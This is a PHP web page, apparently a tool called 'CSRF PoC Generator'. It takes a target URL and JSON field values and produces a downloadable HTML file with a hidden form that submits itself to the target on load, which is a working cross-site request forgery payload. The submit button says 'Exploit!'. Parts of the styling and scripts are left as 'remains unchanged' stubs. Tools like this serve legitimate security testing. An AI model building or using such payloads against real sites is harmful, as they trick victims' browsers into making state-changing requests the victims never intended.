<?php
ob_start(); // Start output buffering
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CSRF PoC Generator</title>
<style>
    /* CSS styles remain unchanged */
</style>
</head>
<body>

<div class="container">
    <div class="left">
        <h1>CSRF PoC Generator</h1>

        <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            // Input validation
            $action_url = isset($_POST['action_url']) ? $_POST['action_url'] : '';
            $fields_json = isset($_POST['fields']) ? $_POST['fields'] : '';

            // Sanitize input
            $action_url = filter_var($action_url, FILTER_SANITIZE_URL);

            // Validate JSON format
            $fields = json_decode($fields_json, true);

            if ($action_url && $fields !== null) {
                // Construct HTML form with hidden inputs
                $html_content = "<form id='csrf_form' action='" . htmlspecialchars($action_url) . "' method='POST'>\n";
                foreach ($fields as $name => $value) {
                    $html_content .= "<input type='hidden' name='" . htmlspecialchars($name) . "' value='" . htmlspecialchars($value) . "'>\n";
                }
                $html_content .= "</form>\n<script>document.getElementById('csrf_form').submit();</script>\n</html>";

                // Set headers for download
                header('Content-Disposition: attachment; filename="csrf_poc.html"');
                header('Content-Length: ' . strlen($html_content));
                echo $html_content;
                exit;
            } else {
                echo "<p>Error: Invalid input.</p>";
            }
        }
        ?>

       <form method="post">
            <label for="action_url">Web URL:</label><br>
            <input type="url" id="action_url" name="action_url" required><br>

            <label for="fields">JSON</label><br>
            <textarea id="fields" name="fields" rows="5" cols="50" required></textarea>

            <button type="submit">Download POC File And Exploit!</button>
        </form>

    </div>
    <!-- Right section remains unchanged -->
</div>

<footer>
  <p>
    <a href="https://www.facebook.com/im4xx">Ahmed Najeh</a><br>
    <a href="mailto:im4xiq@gmail.com">im4xiq@gmail.com</a>
  </p>
</footer>

<script>
function copyJSON() {
    // JavaScript function remains unchanged
}
</script>

</body>
</html>
<?php
ob_end_flush(); // Flush output buffer and send the content to the browser
?>
